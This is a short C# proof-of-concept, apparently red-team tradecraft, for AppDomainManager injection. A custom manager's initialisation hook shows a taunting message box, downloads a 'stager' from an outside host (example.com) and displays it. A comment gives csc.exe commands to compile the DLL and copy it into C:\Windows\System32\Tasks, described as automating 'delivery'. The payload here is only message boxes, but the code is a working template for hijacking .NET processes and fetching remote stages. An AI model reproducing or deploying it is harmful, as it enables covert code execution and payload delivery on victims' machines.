using System;
using System.Net;


public sealed class MyAppDomainManager : AppDomainManager
{
  
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
		System.Windows.Forms.MessageBox.Show("BZZZZZZZ - Bite!, Drop & Hatch Zygotes, We're in your blood now...");
		System.Net.WebClient wc = new System.Net.WebClient();
		string stager = wc.DownloadString("http://www.example.com");
		System.Windows.Forms.MessageBox.Show(stager);
        return;
    }
	
}

/*

// You could automate the delivery entirely.
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:tasks.dll firstbite.cs
copy tasks.dll C:\Windows\System32\Tasks\tasks.dll

*/
